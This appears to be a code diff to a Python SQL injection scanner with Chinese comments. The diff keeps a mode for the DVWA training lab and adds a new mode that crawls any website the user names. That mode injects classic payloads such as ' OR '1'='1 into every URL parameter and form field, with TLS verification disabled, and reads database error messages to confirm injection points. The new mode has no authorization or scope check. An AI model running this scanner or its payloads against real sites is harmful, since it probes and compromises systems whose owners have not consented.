@@ -15,6 +15,13 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
 # =================================
 
+# 导入爬虫模块
+try:
+    from crawler import VulnerabilityCrawler
+except ImportError:
+    print(f"{Fore.RED}[ERROR] 无法导入爬虫模块 crawler.py")
+    sys.exit(1)
+
 try:
     from DVWAlogin import DvwaLogin
 
@@ -30,7 +37,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 class IntegratedSQLScanner:
-    """SQL注入扫描器（仅错误注入）"""
+    """SQL注入扫描器（仅错误注入）- DVWA专用，完全不变"""
 
     def __init__(self, timeout: int = 10):
         self.timeout = timeout
@@ -269,44 +276,9 @@ class IntegratedSQLScanner:
         print(f"{Fore.GREEN}扫描完成！生成报告中...")
         return self.generate_report()
 
-    def print_report(self, report: Dict[str, Any]):
-        """打印扫描报告"""
-        print(f"\n{Fore.YELLOW}{'=' * 60}")
-        print(f"{Fore.CYAN}SQL注入扫描报告")
-        print(f"{Fore.YELLOW}{'=' * 60}")
-
-        summary = report['scan_summary']
-        print(f"{Fore.GREEN}目标URL: {summary['target_url']}")
-        print(f"{Fore.GREEN}扫描时间: {summary['scan_time']}")
-        print(f"{Fore.GREEN}测试参数: {summary['parameters_tested']}")
-        print(f"{Fore.GREEN}发现注入点: {summary['injection_points_found']}")
-        print(f"{Fore.GREEN}总漏洞数: {summary['total_vulnerabilities']}")
-
-        if report['vulnerabilities']:
-            print(f"\n{Fore.RED}{'!' * 60}")
-            print(f"{Fore.RED}发现SQL注入漏洞!")
-            print(f"{Fore.RED}{'!' * 60}")
-
-            for i, vuln in enumerate(report['vulnerabilities'], 1):
-                print(f"\n{Fore.YELLOW}[漏洞 #{i}]")
-                print(f"{Fore.CYAN}参数: {vuln.get('parameter', '未知')}")
-                print(f"{Fore.CYAN}类型: {vuln.get('type', '未知')}")
-                print(f"{Fore.CYAN}数据库: {vuln.get('db_type', '未知')}")
-                print(f"{Fore.CYAN}置信度: {vuln.get('confidence', '未知')}")
-                print(f"{Fore.CYAN}Payload: {vuln.get('payload', 'N/A')}")
-
-        else:
-            print(f"\n{Fore.GREEN}{'✓' * 60}")
-            print(f"{Fore.GREEN}未发现SQL注入漏洞")
-            print(f"{Fore.GREEN}{'✓' * 60}")
-
-        print(f"\n{Fore.CYAN}安全建议:")
-        for i, recommendation in enumerate(report['recommendations'], 1):
-            print(f"  {i}. {recommendation}")
-
 
 class BlindSQLInjector:
-    """布尔盲注注入器"""
+    """布尔盲注注入器 - 完全不变"""
 
     def __init__(self, session: requests.Session, base_url: str, cookie: str, timeout: int = 10):
         self.session = session
@@ -570,8 +542,231 @@ class BlindSQLInjector:
         return report
 
 
+class NormalSQLScanner:
+    """普通网站SQL注入扫描器（集成自动爬取）"""
+
+    def __init__(self, timeout: int = 10):
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.headers.update({"User-Agent": "SQLScanner/1.0"})
+
+        self.results = {
+            'target_url': '普通网站多页面',
+            'vulnerabilities': [],
+            'scan_time': None,
+            'parameters_tested': 0,
+            'injection_points_found': 0
+        }
+
+        # Payload与DVWA版本保持一致
+        self.payloads = [
+            "'", "''", "`", "\\'", "\"", "\\\"", ";",
+            "' OR '1'='1", "' OR 1=1--", "') OR ('1'='1",
+            "' OR '1'='1'--", "' OR 'a'='a", "' OR 1=1#",
+            "' OR 1=1-- -", "' OR 1=1/*"
+        ]
+
+        self.db_fingerprints = {
+            'mysql': [r'you have an error in your sql syntax', r'check the manual.*mysql', r'mysql'],
+            'mssql': [r'microsoft (?:sql )?server', r'unclosed quotation mark', r'odbc driver'],
+            'oracle': [r'ora-\d{5}', r'oracle error', r'pl/sql'],
+            'postgresql': [r'error: syntax error at or near', r'postgresql', r'pg_']
+        }
+
+    def detect_db_type(self, text: str) -> str:
+        """检测数据库类型"""
+        if not text:
+            return 'unknown'
+        for db_type, patterns in self.db_fingerprints.items():
+            for pattern in patterns:
+                try:
+                    if re.search(pattern, text, re.IGNORECASE):
+                        return db_type
+                except:
+                    if pattern.lower() in text.lower():
+                        return db_type
+        return 'unknown'
+
+    def test_url_params(self, url: str, param_list: List[str]) -> List[Dict]:
+        """测试URL参数注入"""
+        vulns = []
+        parsed = urllib.parse.urlparse(url)
+        all_params = urllib.parse.parse_qs(parsed.query)
+
+        for param_name in param_list:
+            original_value = all_params.get(param_name, [""])[0]
+            print(f"{Fore.CYAN}[TEST] 测试参数: {param_name}")
+
+            for payload in self.payloads:
+                test_params = all_params.copy()
+                test_params[param_name] = [original_value + payload]
+
+                try:
+                    response = self.session.get(
+                        url.split('?')[0],
+                        params=test_params,
+                        timeout=self.timeout,
+                        verify=False
+                    )
+
+                    db_type = self.detect_db_type(response.text)
+                    if db_type != 'unknown':
+                        vulns.append({
+                            'parameter': param_name,
+                            'payload': payload,
+                            'db_type': db_type,
+                            'url': url
+                        })
+                        print(f"{Fore.GREEN}[FOUND] {param_name} -> {db_type}")
+                        break
+                except:
+                    continue
+
+        return vulns
+
+    def test_form(self, form_url: str, method: str, form_data: Dict) -> List[Dict]:
+        """测试表单注入"""
+        vulns = []
+
+        for field_name in form_data.keys():
+            print(f"{Fore.CYAN}[TEST] 测试表单字段: {field_name}")
+
+            for payload in self.payloads:
+                test_data = form_data.copy()
+                original_value = test_data.get(field_name, "")
+                test_data[field_name] = original_value + payload
+
+                try:
+                    if method.upper() == 'GET':
+                        response = self.session.get(form_url, params=test_data, timeout=self.timeout, verify=False)
+                    else:
+                        response = self.session.post(form_url, data=test_data, timeout=self.timeout, verify=False)
+
+                    db_type = self.detect_db_type(response.text)
+                    if db_type != 'unknown':
+                        vulns.append({
+                            'form_url': form_url,
+                            'field': field_name,
+                            'payload': payload,
+                            'db_type': db_type,
+                            'method': method
+                        })
+                        print(f"{Fore.GREEN}[FOUND] 字段 {field_name} -> {db_type}")
+                        break
+                except:
+                    continue
+
+        return vulns
+
+    def crawl_and_scan(self, base_url: str, max_depth: int = 2) -> Dict[str, Any]:
+        """自动爬取并扫描"""
+        print(f"{Fore.YELLOW}[INFO] 开始自动爬取目标网站...")
+        print(f"{Fore.CYAN}目标: {base_url}")
+        print(f"{Fore.CYAN}深度: {max_depth}")
+        print("-" * 50)
+
+        # 执行爬取
+        crawler = VulnerabilityCrawler(base_url, max_depth=max_depth)
+        crawler.crawl(base_url)
+
+        # 显示爬取统计
+        results = crawler.get_results()
+
+        # 保存爬取结果
+        crawl_file = crawler.save_results()
+        print(f"\n{Fore.GREEN}[✓] 爬取完成，结果已保存")
+
+        # 开始扫描
+        print(f"{Fore.YELLOW}[INFO] 开始SQL注入扫描...")
+        print("-" * 50)
+
+        all_vulns = []
+        tested = 0
+
+        # 测试URL参数
+        if results['url_params']:
+            print(f"{Fore.CYAN}[INFO] 测试URL参数注入点...")
+            for item in results['url_params']:
+                url = item['url']
+                params = item['params']
+                tested += len(params)
+                print(f"\n{Fore.BLUE}[URL] {url}")
+                vulns = self.test_url_params(url, params)
+                all_vulns.extend(vulns)
+
+        # 测试表单
+        if results['forms']:
+            print(f"{Fore.CYAN}{'=' * 50}")
+            print(f"{Fore.CYAN}[INFO] 测试表单注入点...")
+            for item in results['forms']:
+                form_url = item['url']
+                method = item['method']
+                form_data = item['form_data']
+                tested += len(form_data)
+                print(f"\n{Fore.BLUE}[FORM] {form_url} [{method.upper()}]")
+                vulns = self.test_form(form_url, method, form_data)
+                all_vulns.extend(vulns)
+
+        self.results['vulnerabilities'] = all_vulns
+        self.results['parameters_tested'] = tested
+        self.results['injection_points_found'] = len(all_vulns)
+
+        return self.generate_report()
+
+    def generate_report(self) -> Dict[str, Any]:
+        """生成报告"""
+        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')
+        return {
+            'scan_summary': {
+                'target_url': self.results['target_url'],
+                'scan_time': self.results['scan_time'],
+                'parameters_tested': self.results['parameters_tested'],
+                'injection_points_found': self.results['injection_points_found'],
+                'total_vulnerabilities': len(self.results['vulnerabilities'])
+            },
+            'vulnerabilities': self.results['vulnerabilities'],
+            'recommendations': [
+                "使用参数化查询或预编译语句",
+                "实施输入验证和过滤",
+                "使用Web应用防火墙(WAF)",
+                "最小权限原则配置数据库账户"
+            ]
+        }
+
+    def print_report(self, report: Dict[str, Any]):
+        """打印报告"""
+        print(f"\n{Fore.YELLOW}{'=' * 60}")
+        print(f"{Fore.CYAN}SQL注入扫描报告 (普通网站)")
+        print(f"{Fore.YELLOW}{'=' * 60}")
+
+        summary = report['scan_summary']
+        print(f"{Fore.GREEN}目标: {summary['target_url']}")
+        print(f"{Fore.GREEN}扫描时间: {summary['scan_time']}")
+        print(f"{Fore.GREEN}测试参数: {summary['parameters_tested']}")
+        print(f"{Fore.GREEN}发现漏洞: {summary['total_vulnerabilities']}")
+
+        if report['vulnerabilities']:
+            print(f"\n{Fore.RED}{'!' * 60}")
+            print(f"{Fore.RED}发现SQL注入漏洞!")
+            print(f"{Fore.RED}{'!' * 60}")
+
+            for i, vuln in enumerate(report['vulnerabilities'], 1):
+                print(f"\n{Fore.YELLOW}[漏洞 #{i}]")
+                if 'parameter' in vuln:
+                    print(f"{Fore.CYAN}参数: {vuln['parameter']}")
+                if 'field' in vuln:
+                    print(f"{Fore.CYAN}表单字段: {vuln['field']}")
+                print(f"{Fore.CYAN}Payload: {vuln['payload']}")
+                print(f"{Fore.CYAN}数据库: {vuln['db_type']}")
+                print(f"{Fore.CYAN}位置: {vuln.get('url') or vuln.get('form_url')}")
+        else:
+            print(f"\n{Fore.GREEN}{'✓' * 60}")
+            print(f"{Fore.GREEN}未发现SQL注入漏洞")
+            print(f"{Fore.GREEN}{'✓' * 60}")
+
+
 def print_report(report: Dict[str, Any], scan_type: str):
-    """统一打印扫描报告"""
+    """统一打印DVWA扫描报告 - 完全不变"""
     print(f"\n{Fore.YELLOW}{'=' * 60}")
     print(f"{Fore.CYAN}SQL注入扫描报告 ({scan_type})")
     print(f"{Fore.YELLOW}{'=' * 60}")
@@ -622,99 +817,148 @@ def print_report(report: Dict[str, Any], scan_type: str):
 
 
 def main():
-    """主函数"""
+    """主函数 - DVWA流程完全不变，普通网站自动爬取"""
     print(f"{Fore.CYAN}整合版SQL注入扫描器")
-    print(f"{Fore.CYAN}支持错误注入和布尔盲注")
+    print(f"{Fore.CYAN}支持: DVWA靶场 (错误注入+布尔盲注) / 普通网站(自动爬取)")
     print("=" * 50)
 
-    dvwa_url = input("请输入DVWA的URL (例如: http://192.168.26.130:8085): ").strip()
-    if not dvwa_url:
-        print(f"{Fore.RED}URL不能为空")
-        return
-
-    print(f"{Fore.CYAN}[1/4] 初始化登录模块...")
-    dvwa_login = DvwaLogin()
-
-    print(f"{Fore.CYAN}[2/4] 登录DVWA...")
-    if not dvwa_login.login(dvwa_url):
-        print(f"{Fore.RED}登录失败，程序退出")
-        return
-
-    dvwa_login.test_connection()
-
-    # 获取会话信息
-    session_info = dvwa_login.get_session_info()
-    if not session_info:
-        print(f"{Fore.RED}无法获取会话信息")
-        return
-
-    # 让用户选择扫描类型
-    print("\n" + "=" * 50)
-    print(f"{Fore.CYAN}请选择扫描类型:")
-    print("1. 错误注入 (Error-based)--（快速发现漏洞）")
-    print("2. 布尔盲注 (Boolean Blind)--（深度数据提取）")
+    # 选择扫描模式
+    print("请选择扫描模式:")
+    print("1. 扫描DVWA靶场 (保留错误注入和布尔盲注)")
+    print("2. 扫描普通网站 (自动爬取+错误注入)")
     choice = input("请输入选项 (1 或 2): ").strip()
 
+    # ==================== DVWA流程 - 完全不变 ====================
     if choice == '1':
-        scan_type = "错误注入"
-        print(f"{Fore.CYAN}[3/4] 初始化错误注入扫描器...")
-        scanner = IntegratedSQLScanner(timeout=15)
-
-        if not scanner.setup_session(dvwa_login):
-            print(f"{Fore.RED}设置会话失败")
+        dvwa_url = input("请输入DVWA的URL (例如: http://192.168.26.130:8085): ").strip()
+        if not dvwa_url:
+            print(f"{Fore.RED}URL不能为空")
             return
 
-        print(f"{Fore.CYAN}[4/4] 开始错误注入扫描...")
-        report = scanner.scan_dvwa()
+        print(f"{Fore.CYAN}[1/4] 初始化登录模块...")
+        dvwa_login = DvwaLogin()
 
+        print(f"{Fore.CYAN}[2/4] 登录DVWA...")
+        if not dvwa_login.login(dvwa_url):
+            print(f"{Fore.RED}登录失败，程序退出")
+            return
+
+        dvwa_login.test_connection()
+
+        # 获取会话信息
+        session_info = dvwa_login.get_session_info()
+        if not session_info:
+            print(f"{Fore.RED}无法获取会话信息")
+            return
+
+        # 让用户选择扫描类型
+        print("\n" + "=" * 50)
+        print(f"{Fore.CYAN}请选择扫描类型:")
+        print("1. 错误注入 (Error-based)--（快速发现漏洞）")
+        print("2. 布尔盲注 (Boolean Blind)--（深度数据提取）")
+        scan_choice = input("请输入选项 (1 或 2): ").strip()
+
+        if scan_choice == '1':
+            scan_type = "错误注入"
+            print(f"{Fore.CYAN}[3/4] 初始化错误注入扫描器...")
+            scanner = IntegratedSQLScanner(timeout=15)
+
+            if not scanner.setup_session(dvwa_login):
+                print(f"{Fore.RED}设置会话失败")
+                return
+
+            print(f"{Fore.CYAN}[4/4] 开始错误注入扫描...")
+            report = scanner.scan_dvwa()
+
+        elif scan_choice == '2':
+            scan_type = "布尔盲注"
+            print(f"{Fore.CYAN}[3/4] 初始化盲注扫描器...")
+
+            # 构建cookie字符串
+            session_cookies = session_info['session'].cookies
+            cookie_parts = []
+            for name, value in session_cookies.items():
+                cookie_parts.append(f"{name}={value}")
+
+            # 从DVWAlogin获取安全等级cookie
+            security_cookie = getattr(dvwa_login, 'security_cookie', 'security=low')
+            if 'security=' not in security_cookie:
+                security_cookie = 'security=low'
+
+            full_cookie = f"{'; '.join(cookie_parts)}; {security_cookie}"
+
+            injector = BlindSQLInjector(
+                session=session_info['session'],
+                base_url=session_info['base_url'],
+                cookie=full_cookie,
+                timeout=15
+            )
+
+            print(f"{Fore.CYAN}[4/4] 开始布尔盲注扫描...")
+            report = injector.scan()
+
+        else:
+            print(f"{Fore.RED}无效选项")
+            return
+
+        if report:
+            print_report(report, scan_type)
+
+            # 保存报告到相对路径
+            report_dir = os.path.join(CURRENT_DIR, 'scan_result', 'sql_scanner')
+            os.makedirs(report_dir, exist_ok=True)
+
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            filename = f"dvwa_{'error' if scan_choice == '1' else 'blind'}_scan_report_{timestamp}.json"
+            filepath = os.path.join(report_dir, filename)
+
+            with open(filepath, 'w', encoding='utf-8') as f:
+                json.dump(report, f, indent=2, ensure_ascii=False)
+
+            print(f"{Fore.GREEN}报告已保存到: {filepath}")
+        else:
+            print(f"{Fore.RED}扫描失败")
+
+    # ==================== 普通网站流程 - 自动爬取 ====================
     elif choice == '2':
-        scan_type = "布尔盲注"
-        print(f"{Fore.CYAN}[3/4] 初始化盲注扫描器...")
+        base_url = input("请输入目标网站首页URL: ").strip()
+        if not base_url:
+            print(f"{Fore.RED}URL不能为空")
+            return
 
-        # 构建cookie字符串
-        session_cookies = session_info['session'].cookies
-        cookie_parts = []
-        for name, value in session_cookies.items():
-            cookie_parts.append(f"{name}={value}")
+        # 询问爬取深度
+        depth_input = input("请输入爬取深度 (默认2): ").strip()
+        max_depth = int(depth_input) if depth_input.isdigit() else 2
 
-        # 从DVWAlogin获取安全等级cookie
-        security_cookie = getattr(dvwa_login, 'security_cookie', 'security=low')
-        if 'security=' not in security_cookie:
-            security_cookie = 'security=low'
+        # 开始自动爬取并扫描
+        print(f"\n{Fore.CYAN}[1/2] 初始化扫描器...")
+        scanner = NormalSQLScanner(timeout=10)
 
-        full_cookie = f"{'; '.join(cookie_parts)}; {security_cookie}"
+        print(f"{Fore.CYAN}[2/2] 自动爬取并扫描...")
+        print("=" * 50)
+        report = scanner.crawl_and_scan(base_url, max_depth)
 
-        injector = BlindSQLInjector(
-            session=session_info['session'],
-            base_url=session_info['base_url'],
-            cookie=full_cookie,
-            timeout=15
-        )
+        if report:
+            scanner.print_report(report)
 
-        print(f"{Fore.CYAN}[4/4] 开始布尔盲注扫描...")
-        report = injector.scan()
+            # 保存报告
+            report_dir = os.path.join(CURRENT_DIR, 'scan_result', 'sql_scanner')
+            os.makedirs(report_dir, exist_ok=True)
+
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"normal_sql_report_{timestamp}.json"
+            filepath = os.path.join(report_dir, filename)
+
+            with open(filepath, 'w', encoding='utf-8') as f:
+                json.dump(report, f, indent=2, ensure_ascii=False)
+
+            print(f"\n{Fore.GREEN}报告已保存: {filepath}")
+        else:
+            print(f"{Fore.RED}扫描失败")
 
     else:
         print(f"{Fore.RED}无效选项")
         return
-
-    if report:
-        print_report(report, scan_type)
-
-        # 保存报告到相对路径
-        report_dir = os.path.join(CURRENT_DIR, 'scan_result', 'sql_scanner')
-        os.makedirs(report_dir, exist_ok=True)
-
-        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        filename = f"dvwa_{'error' if choice == '1' else 'blind'}_scan_report_{timestamp}.json"
-        filepath = os.path.join(report_dir, filename)
-
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(report, f, indent=2, ensure_ascii=False)
-
-        print(f"{Fore.GREEN}报告已保存到: {filepath}")
-    else:
-        print(f"{Fore.RED}扫描失败")
 
 
 if __name__ == "__main__":
